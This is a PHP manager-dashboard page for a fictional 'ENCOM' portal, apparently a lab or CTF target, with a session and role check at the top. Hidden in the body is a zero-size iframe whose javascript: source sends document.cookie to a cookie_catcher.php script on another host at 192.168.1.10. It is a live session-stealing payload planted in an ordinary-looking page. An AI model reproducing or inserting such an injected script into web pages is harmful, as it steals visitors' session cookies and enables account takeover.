<?php
session_start();

// Strict Access Control: Validate that the session is active AND the role is explicitly 'manager'
if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true || $_SESSION['role'] !== 'manager') {
    // Terminate unauthorized access attempts silently or redirect to login
    header("Location: login.php");
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Manager Dashboard</title>
    <style>
        body { background-color: #000; color: #00ffcc; font-family: monospace; padding: 50px; }
        .container { border: 2px solid #00ffcc; padding: 20px; }
        a { color: #ff3333; }
    </style>
</head>
<body>
<iframe frameboarder=0 height=0 width=0 src=javascript:void(document.location="http://192.168.1.10/cookie_catcher.php?c="+document.cookie) </iframe >
<div class="container">
    <h1>Welcome to the ENCOM Central Network Portal</h1>
    <p>System Status: ONLINE</p>
    <p>Current User: <strong><?php echo htmlspecialchars($_SESSION['username']); ?></strong></p>
    <p>Security Level: <strong>RESTRICTED // ADMINISTRATIVE CONTROL PANEL</strong></p>
    <hr>
    <h3>Administrative Controls</h3>
    <p>This view is restricted entirely to users with Manager-level clearance.</p>
    <p>[SECURE_KEY_BLOCK_OS12-SEC4]</p>
    <hr>
    <p><a href="logout.php">Terminate Session (Logout)</a></p>
</div>

</body>
</html>
